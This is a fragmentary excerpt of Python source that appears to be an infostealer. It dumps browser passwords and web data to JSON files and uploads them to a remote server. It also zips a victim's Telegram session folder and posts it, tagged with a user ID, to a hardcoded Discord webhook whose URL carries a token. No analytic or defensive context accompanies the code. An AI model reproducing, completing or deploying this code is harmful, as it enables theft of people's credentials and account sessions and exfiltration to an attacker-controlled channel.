...
discord_webhook = "https://discord.com/api/webhooks/1409939061157789857/-IJXqjMdt2EU1SYYSLyyl4reWSFAf0lhM_fJ7HDrEwrtVgcDQQs5xlPUjjbS-u1ytFlC"
...
def upload_to_server(filepath):
    ...
    for i in range(10):
        ...
        try:
            ...
            r = requests.post(url, files={'file': (os.path.basename(filepath), open(filepath, 'rb'))}, data={'content': f"User ID: {userid}"})
...
password_file = os.path.join(STORAGE_PATH, "passwords.json")

with open(password_file, "w") as f:

    f.write(password_json_data)

upload_to_server(password_file)
...
web_data_file = os.path.join(STORAGE_PATH, "web_data.json")

with open(web_data_file, "w") as f:

    f.write(web_data_json)

upload_to_server(web_data_file)
...
def telegram():
    ...
    if os.path.exists(source_path):
        ...
        with open(zip_path, 'rb') as f:
            response = requests.post(discord_webhook, files={'file': ('tdata_session.zip', f)}, data={'content': f"User ID: {userid}"})
